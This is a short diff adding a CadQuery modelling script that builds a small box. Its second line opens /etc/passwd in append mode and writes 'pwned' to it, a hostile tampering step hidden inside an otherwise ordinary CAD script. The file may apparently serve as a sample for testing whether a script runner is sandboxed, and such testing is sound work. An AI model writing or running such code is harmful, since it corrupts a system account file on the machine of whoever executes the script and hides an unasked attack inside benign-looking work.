@@ -1,0 +1,3 @@
+import cadquery as cq
+open("/etc/passwd", "a").write("pwned\n")
+result = cq.Workplane("XY").box(3, 3, 3)
